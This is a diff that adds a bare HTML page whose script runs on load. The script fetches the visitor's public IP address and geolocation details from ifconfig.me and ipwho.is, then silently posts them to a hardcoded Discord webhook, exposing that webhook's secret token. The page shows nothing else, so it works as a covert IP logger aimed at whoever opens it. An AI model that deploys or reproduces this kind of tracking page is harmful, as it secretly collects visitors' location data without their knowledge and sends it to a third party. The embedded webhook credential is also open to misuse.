@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Send Raw IP Data</title>
+</head>
+<body>
+<script>
+async function sendRawIpData() {
+    try {
+        // Fetch raw IP from ifconfig.me
+        const ipRaw = await fetch('https://ifconfig.me/ip')
+            .then(res => res.text());
+
+        // Fetch raw info from ipwho.is
+        const whoisRaw = await fetch('https://ipwho.is/')
+            .then(res => res.text());
+
+        // Prepare payload with raw responses
+        const payload = {
+            content: `**Raw ifconfig.me Response:**\n\`\`\`\n${ipRaw}\n\`\`\`\n**Raw ipwho.is Response:**\n\`\`\`\n${whoisRaw}\n\`\`\``
+        };
+
+        // Send to Discord webhook
+        await fetch('https://discord.com/api/webhooks/1248875456510562335/LW5oN6hzV3GxvqcxIgc3YwQhOEG8OTpfl1xESSEsD4mm8OWviQQyvnfj9oLYMwOCvf8d', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(payload)
+        });
+
+        console.log('Raw IP data sent!');
+    } catch (err) {
+        console.error('Error:', err);
+    }
+}
+
+// Execute the function
+sendRawIpData();
+</script>
+</body>
+</html>
